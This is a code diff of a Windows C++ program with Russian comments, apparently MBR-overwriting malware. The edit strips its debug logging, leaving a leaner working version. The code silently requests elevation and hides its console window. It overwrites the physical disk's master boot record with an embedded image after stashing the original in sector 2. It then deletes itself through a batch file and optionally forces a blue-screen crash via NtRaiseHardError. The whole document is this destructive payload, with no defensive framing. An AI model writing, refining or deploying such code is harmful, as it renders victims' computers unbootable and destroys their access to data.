@@ -13,26 +13,9 @@
 const char MARKER_MBR[] = "MBR";
 
 // ============================================================
-// ЛОГИРОВАНИЕ В ФАЙЛ (В ТЕКУЩЕЙ ПАПКЕ)
-// ============================================================
-void Log(const char* msg) {
-    std::ofstream log("log.txt", std::ios::app);
-    if (log.is_open()) {
-        log << msg << std::endl;
-        log.close();
-    }
-}
-
-// Перегрузка для std::string
-void Log(const std::string& msg) {
-    Log(msg.c_str());
-}
-
-// ============================================================
 // ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
 // ============================================================
 bool IsAdmin() {
-    Log("IsAdmin() called");
     BOOL isAdmin = FALSE;
     PSID adminGroup = NULL;
     SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
@@ -44,7 +27,6 @@ bool IsAdmin() {
         FreeSid(adminGroup);
     }
     
-    Log(isAdmin ? "IsAdmin: TRUE" : "IsAdmin: FALSE");
     return isAdmin == TRUE;
 }
 
@@ -52,30 +34,20 @@ bool IsAdmin() {
 // ВКЛЮЧЕНИЕ ПРИВИЛЕГИИ ДЛЯ BSOD
 // ============================================================
 void EnableShutdownPrivilege() {
-    Log("EnableShutdownPrivilege() called");
     HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        Log("OpenProcessToken failed");
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         return;
-    }
     
     TOKEN_PRIVILEGES tp;
     LUID luid;
-    if (!LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &luid)) {
-        Log("LookupPrivilegeValue failed");
-        CloseHandle(hToken);
+    if (!LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &luid))
         return;
-    }
     
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Luid = luid;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
-        Log("AdjustTokenPrivileges failed");
-    } else {
-        Log("Shutdown privilege enabled");
-    }
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
     CloseHandle(hToken);
 }
 
@@ -83,12 +55,8 @@ void EnableShutdownPrivilege() {
 // ВЫЗОВ BSOD
 // ============================================================
 void TriggerBSOD() {
-    Log("TriggerBSOD() called");
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) {
-        Log("ntdll.dll not loaded");
-        return;
-    }
+    if (!ntdll) return;
     
     typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
         NTSTATUS ErrorStatus,
@@ -100,10 +68,7 @@ void TriggerBSOD() {
     );
     
     NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
-    if (!NtRaiseHardError) {
-        Log("NtRaiseHardError not found");
-        return;
-    }
+    if (!NtRaiseHardError) return;
     
     EnableShutdownPrivilege();
     
@@ -118,18 +83,16 @@ void TriggerBSOD() {
         6,           // OptionShutdownSystem
         &response
     );
-    Log("BSOD triggered");
 }
 
 // ============================================================
 // ПОВЫШЕНИЕ ПРАВ
 // ============================================================
 void ElevateAndRun() {
-    Log("ElevateAndRun() called");
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
-    Log(std::string("Path: ") + szPath);
     
+    // Получаем командную строку для передачи аргументов
     LPSTR lpCmdLine = GetCommandLineA();
     
     SHELLEXECUTEINFOA sei = {0};
@@ -140,10 +103,7 @@ void ElevateAndRun() {
     sei.nShow = SW_HIDE;
     
     if (ShellExecuteExA(&sei)) {
-        Log("Elevated successfully, exiting...");
         ExitProcess(0);
-    } else {
-        Log("Elevation failed!");
     }
 }
 
@@ -151,36 +111,18 @@ void ElevateAndRun() {
 // ЗАПИСЬ MBR (ИЗ РЕСУРСА)
 // ============================================================
 void WriteMBR() {
-    Log("=== WriteMBR() START ===");
-    
     // Загружаем ресурс "MBR" (BINARY)
-    Log("Loading resource 'MBR'...");
     HRSRC hRes = FindResourceA(NULL, "MBR", "BINARY");
-    if (!hRes) {
-        Log("ERROR: Resource 'MBR' not found!");
-        return;
-    }
-    Log("Resource 'MBR' found");
+    if (!hRes) return;
     
     HGLOBAL hData = LoadResource(NULL, hRes);
-    if (!hData) {
-        Log("ERROR: Failed to load resource!");
-        return;
-    }
-    Log("Resource loaded");
+    if (!hData) return;
     
     DWORD size = SizeofResource(NULL, hRes);
-    Log(std::string("Resource size: ") + std::to_string(size));
-    
     unsigned char* image = (unsigned char*)LockResource(hData);
-    if (!image || size < 512) {
-        Log("ERROR: LockResource failed or size < 512");
-        return;
-    }
-    Log("Resource locked");
+    if (!image || size < 512) return;
     
     // Открываем диск
-    Log("Opening disk...");
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
         GENERIC_READ | GENERIC_WRITE,
@@ -192,7 +134,6 @@ void WriteMBR() {
     );
     
     if (hDisk == INVALID_HANDLE_VALUE) {
-        Log(std::string("CreateFile failed, error: ") + std::to_string(GetLastError()));
         hDisk = CreateFileA(
             "\\\\.\\PhysicalDrive0",
             GENERIC_READ | GENERIC_WRITE,
@@ -202,52 +143,34 @@ void WriteMBR() {
             0,
             NULL
         );
-        if (hDisk == INVALID_HANDLE_VALUE) {
-            Log(std::string("Fallback failed, error: ") + std::to_string(GetLastError()));
-            return;
-        }
-        Log("Disk opened via fallback");
-    } else {
-        Log("Disk opened successfully");
+        if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
     // --- ШАГ 1: ЧИТАЕМ ОРИГИНАЛ ---
-    Log("Reading original MBR...");
     unsigned char originalMBR[512];
     DWORD bytesRead = 0;
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
     if (!ReadFile(hDisk, originalMBR, 512, &bytesRead, NULL) || bytesRead != 512) {
-        Log("ReadFile failed!");
         CloseHandle(hDisk);
         return;
     }
-    Log("Original MBR read OK");
     
     // --- ШАГ 2: СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОР 2 ---
-    Log("Saving original MBR to sector 2...");
     DWORD bytesWritten = 0;
     SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
     if (!WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL) || bytesWritten != 512) {
-        Log("WriteFile to sector 2 failed!");
         CloseHandle(hDisk);
         return;
     }
-    Log("Original MBR saved to sector 2");
     
     // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
-    Log(std::string("Writing our image, size: ") + std::to_string(size));
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
     WriteFile(hDisk, image, size, &bytesWritten, NULL);
-    Log(std::string("Image written, bytes: ") + std::to_string(bytesWritten));
-    
     CloseHandle(hDisk);
-    Log("Disk closed");
     
     // --- Самоуничтожение ---
-    Log("Self-destruct...");
     char szPath[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
-    Log(std::string("Path: ") + szPath);
     
     std::string batPath = std::string(szPath) + ".bat";
     std::ofstream bat(batPath.c_str());
@@ -256,7 +179,6 @@ void WriteMBR() {
     bat << "del \"" << szPath << "\"\n";
     bat << "del \"" << batPath << "\"\n";
     bat.close();
-    Log("Bat file created");
     
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
@@ -266,38 +188,25 @@ void WriteMBR() {
     
     CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    Log("Bat file launched");
     
     // --- BSOD (если есть маркер в ресурсах) ---
     if (FindResourceA(NULL, "BSOD", RT_RCDATA)) {
-        Log("BSOD flag found, triggering...");
         TriggerBSOD();
-    } else {
-        Log("BSOD flag NOT found");
     }
-    
-    Log("=== WriteMBR() END ===");
 }
 
 // ============================================================
 // ТОЧКА ВХОДА
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
-    Log("=== WinMain() START ===");
-    
     if (!IsAdmin()) {
-        Log("Not admin, elevating...");
         ElevateAndRun();
         return 0;
     }
-    Log("Admin OK");
     
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    Log("Console window hidden");
     
     WriteMBR();
-    Log("WriteMBR completed");
     
-    Log("=== WinMain() END ===");
     return 0;
 }
